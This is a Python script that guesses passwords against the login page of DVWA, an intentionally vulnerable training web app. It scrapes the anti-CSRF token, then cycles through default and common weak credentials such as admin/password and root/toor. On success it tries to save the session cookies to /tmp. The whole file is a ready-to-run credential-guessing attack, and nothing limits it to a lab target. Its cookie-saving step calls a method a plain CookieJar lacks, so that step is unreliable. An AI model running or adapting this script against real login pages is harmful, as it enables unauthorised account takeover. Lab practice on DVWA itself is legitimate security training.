#!/usr/bin/env python3
"""DVWA 默认账号爆破: 逐个尝试 (user, pass) 组合, 自动处理 CSRF token.
用法: python3 dvwa_brute_default.py <base_url>
"""
import re, sys, urllib.request, http.cookiejar

base = sys.argv[1]
creds = [
    ("admin", "password"), ("admin", "Password"), ("admin", "admin"),
    ("admin", "dvwa"), ("admin", "p@ssw0rd"), ("admin", "123456"),
    ("admin", "letmein"), ("admin", "charley"), ("admin", "abc123"),
    ("gordonb", "abc123"), ("1337", "charley"), ("pablo", "letmein"),
    ("smithy", "password"), ("admin", "password1"), ("admin", "admin123"),
    ("admin", "toor"), ("root", "password"), ("admin", "changeme"),
]

def try_login(user, pwd):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    html = op.open(base + "/login.php", timeout=10).read().decode(errors="replace")
    m = re.search(r"name='user_token'\s+value='([0-9a-f]+)'", html)
    if not m:
        return None
    data = urllib.parse.urlencode({"username": user, "password": pwd,
                                   "Login": "Login", "user_token": m.group(1)}).encode()
    body = op.open(base + "/login.php", data=data, timeout=10).read().decode(errors="replace")
    ok = "Login failed" not in body
    return ok, op, cj

for u, p in creds:
    try:
        r = try_login(u, p)
        if r is None:
            print("token parse fail"); continue
        ok, op, cj = r
        print(f"{u}:{p} -> {'OK' if ok else 'fail'}")
        if ok:
            # verify index access
            resp = op.open(base + "/index.php", timeout=10)
            print("index:", resp.status, resp.geturl())
            cj.save("/tmp/dvwa_good.cookies", ignore_discard=True, ignore_expires=True)
            sys.exit(0)
    except Exception as e:
        print(u, p, "ERR", e)
print("no luck")
